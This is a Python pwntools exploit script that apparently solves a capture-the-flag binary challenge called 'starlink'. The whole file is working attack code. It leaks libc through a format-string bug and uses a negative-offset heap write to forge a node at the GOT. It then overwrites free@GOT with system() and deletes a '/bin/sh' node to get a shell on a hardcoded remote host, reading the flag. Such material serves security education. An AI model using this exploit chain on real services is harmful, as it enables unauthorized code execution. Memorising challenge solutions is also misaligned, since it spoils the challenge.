#!/usr/bin/env python3
# solve.py — starlink solver
# Format string leak + Description edit to forge fake node in GOT area
# Then update fake node to overwrite free@GOT with system, delete "/bin/sh" node
from pwn import *
import sys, time

context.binary = './files/starlink'

e = ELF('./files/starlink')
libc = ELF('./files/libc.so.6')

REMOTE_HOST = sys.argv[1] if len(sys.argv) >= 3 else '194.102.62.175'
REMOTE_PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 24765

LIBC_START_MAIN_RET = 0x2a1ca  # __libc_start_main return offset (glibc 2.39)
FAKE_NODE = 0x403FE7            # fake node addr: name[0]=\x00, content area = free@GOT

def exploit(p):
    # === STEP 1: Init with format string leak ===
    p.recvuntil(b'store'); p.send(b'd\n')
    p.recvuntil(b'number'); p.sendline(b'1')
    p.recvuntil(b'secret'); p.send(b's\n')
    p.recvuntil(b'name')
    # Name field (7 bytes) is passed to printf() — format string vuln
    p.send(b'%9$p\n')
    time.sleep(0.3)
    data = p.recvuntil(b'> ')
    leak_str = data.split(b'welcome ')[1].split(b'\n')[0]
    libc_leak = int(leak_str, 16)
    libc_base = libc_leak - LIBC_START_MAIN_RET
    system = libc_base + libc.sym['system']
    log.success(f"libc base: {hex(libc_base)}")
    log.info(f"system: {hex(system)}")

    # === STEP 2: Create 2 nodes ===
    # Node A: name="/bin/sh" — when freed via system(), gives shell
    p.sendline(b'1'); p.recvuntil(b'24):')
    p.send(b'/bin/sh\n')
    p.recvuntil(b'256):'); p.send(b'A'*0x40+b'\n'); p.recvuntil(b'> ')

    # Node B: placeholder (needed so linked list has A->next = B)
    p.sendline(b'1'); p.recvuntil(b'24):')
    p.send(b'BBB\n'); p.recvuntil(b'256):')
    p.send(b'B'*0x40+b'\n'); p.recvuntil(b'> ')

    # === STEP 3: Description edit to overwrite A->next ===
    p.sendline(b'4'); p.recvuntil(b'description \n')

    # Add description (option 1) — allocates 0x18 bytes on heap
    # Description menu has flush_stdin before scanf, so send \n first
    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'1'); time.sleep(0.1)
    p.send(b'D'*23+b'\n')  # read(0, desc_heap, 0x18)
    time.sleep(0.2); p.recvrepeat(0.3)

    # Edit description (option 2) with offset -320
    # desc_heap is at heap+0x1920, A->next is at heap+0x17e0
    # Offset: 0x17e0 - 0x1920 = -0x140 = -320
    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'2')
    p.recvuntil(b'correct?')
    p.sendline(b'-320')
    p.recvuntil(b'correction')
    # read(0, desc_heap-320, 0x18) writes to A->next
    # Point A->next to fake node at 0x403FE7
    # At 0x403FE7: name[0]=\x00 (from __gmon_start__@GOT)
    # At 0x403FE7+0x19=0x404000: free@GOT (content area of fake node)
    p.send(p64(FAKE_NODE) + b'\x00'*15 + b'\n')
    time.sleep(0.2); p.recvrepeat(0.3)

    # Exit description (option 3)
    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'3')
    time.sleep(0.2); p.recvrepeat(0.3)
    log.info("A->next overwritten to fake node at 0x403FE7")

    # === STEP 4: Update fake node to overwrite free@GOT ===
    # Search with empty name "" to match \x00 at fake_node
    p.sendline(b'2')
    p.recvuntil(b'update')
    p.send(b'\n')  # empty name matches \x00
    p.recvuntil(b'content')
    # strcpy(fake_node+0x19, content) = strcpy(0x404000, content)
    # 0x404000 = free@GOT → overwrite with system
    p.send(p64(system) + b'\n')
    time.sleep(0.3)
    p.recvrepeat(0.3)
    log.info("free@GOT overwritten with system()")

    # === STEP 5: Delete "/bin/sh" node → system("/bin/sh") ===
    # free(node_A) now calls system(node_A), and node_A starts with "/bin/sh\0"
    p.sendline(b'3')
    p.recvuntil(b'delete')
    p.send(b'/bin/sh\n')
    time.sleep(0.5)

    log.success("Exploit complete! Shell incoming...")
    p.sendline(b'cat flag* 2>/dev/null; id')
    time.sleep(1)
    d = p.recvrepeat(2)
    log.info(f'output: {d.decode(errors="replace")}')
    p.interactive()

is_local = len(sys.argv) >= 2 and sys.argv[1] == 'local'

if is_local:
    p = process(['./files/ld-linux-x86-64.so.2', './files/starlink'])
    exploit(p)
else:
    p = remote(REMOTE_HOST, REMOTE_PORT)
    exploit(p)
